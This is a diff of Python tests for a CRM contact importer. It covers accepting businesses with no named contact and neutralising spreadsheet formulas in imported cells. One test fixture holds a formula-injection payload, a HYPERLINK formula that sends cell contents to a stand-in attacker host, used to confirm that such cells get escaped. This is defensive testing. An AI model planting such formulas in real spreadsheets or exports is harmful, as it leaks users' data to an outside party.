@@ -75,10 +75,43 @@ class TestRowJudgement:
         plan = plan_import([{"First Name": "Asha", "Phone": "1234"}], mapping)
         assert plan.accepted == []
 
-    def test_a_missing_name_is_rejected(self) -> None:
+    def test_a_row_with_neither_a_person_nor_a_business_is_rejected(self) -> None:
         plan = plan_import([row(**{"First Name": ""})], MAPPING)
         assert plan.accepted == []
-        assert "first_name is empty" in plan.rejected[0].reasons
+        assert "no contact person and no business name" in plan.rejected[0].reasons
+
+    def test_a_business_with_no_named_contact_is_accepted(self) -> None:
+        """The normal state of a prospecting list: a shop and a phone number.
+
+        Requiring a named human would make the common case unimportable, so the
+        business name becomes the record's name and the substitution is recorded
+        rather than left for somebody to infer.
+        """
+        mapping = {"Business": "company", "Phone": "phone"}
+        plan = plan_import(
+            [{"Business": "Sri Lakshmi Sweets", "Phone": "9845011223"}],
+            mapping,
+        )
+        assert len(plan.accepted) == 1
+        accepted = plan.accepted[0]
+        assert accepted.values["first_name"] == "Sri Lakshmi Sweets"
+        assert accepted.capture["company"] == "Sri Lakshmi Sweets"
+        assert accepted.capture["name_is_business"] is True
+
+    def test_a_formula_cell_cannot_survive_into_a_later_export(self) -> None:
+        """A vendor list carrying `=HYPERLINK(...)` must not stay executable."""
+        mapping = {"First Name": "first_name", "Email": "email", "Notes": "notes"}
+        plan = plan_import(
+            [
+                {
+                    "First Name": "Asha",
+                    "Email": "asha@example.in",
+                    "Notes": '=HYPERLINK("http://evil.example/?"&A1,"click")',
+                }
+            ],
+            mapping,
+        )
+        assert plan.accepted[0].capture["notes"].startswith("'=")
 
     def test_duplicates_inside_the_same_file_are_caught(self) -> None:
         """The commonest way a CRM gets twins on day one."""
